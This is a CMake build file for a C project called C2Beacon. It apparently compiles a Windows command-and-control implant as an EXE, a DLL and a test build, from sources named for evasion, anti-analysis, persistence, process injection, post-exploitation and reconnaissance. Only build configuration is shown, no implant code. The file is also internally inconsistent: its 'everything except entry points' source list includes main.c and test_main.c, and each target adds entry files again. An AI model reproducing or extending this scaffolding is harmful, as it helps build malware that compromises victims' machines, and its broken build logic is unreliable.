cmake_minimum_required(VERSION 3.20)
project(C2Beacon C)
set(CMAKE_C_STANDARD 11)

# -- Compiler flags ----------------------------------------------------
add_compile_options(-mrdrnd)

# -- Shared link libraries ---------------------------------------------
set(BEACON_LIBS winhttp ws2_32 bcrypt advapi32 ntdll iphlpapi gdi32 user32 netapi32)

# -- Shared source (everything except entry points) --------------------
set(BEACON_CORE
    src/comms.c
    src/evasion.c
    src/anti_analysis.c
    src/persist.c
    src/injection.c
    src/postex.c
    src/recon.c
    src/killswitch.c
    src/test_main.c
    src/crypto.c
    src/main.c
)

# -- EXE target --------------------------------------------------------
add_executable(beacon ${BEACON_CORE} src/main.c src/dllmain.c)
target_include_directories(beacon PRIVATE include)
target_link_libraries(beacon ${BEACON_LIBS})

# -- DLL target --------------------------------------------------------
add_library(beacon_dll SHARED ${BEACON_CORE} src/main.c src/dllmain.c)
target_include_directories(beacon_dll PRIVATE include)
target_compile_definitions(beacon_dll PRIVATE BEACON_DLL)
target_link_libraries(beacon_dll ${BEACON_LIBS})

# -- Test target (no C2 needed) ----------------------------------------
add_executable(beacon_test ${BEACON_CORE} src/test_main.c src/dllmain.c)
target_include_directories(beacon_test PRIVATE include)
target_compile_definitions(beacon_test PRIVATE BEACON_TEST)
target_link_libraries(beacon_test ${BEACON_LIBS})

# -- Release flags -----------------------------------------------------
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    target_compile_options(beacon PRIVATE -O2 -s)
    target_compile_options(beacon_dll PRIVATE -O2 -s)
    target_compile_options(beacon_test PRIVATE -O2 -s)
endif()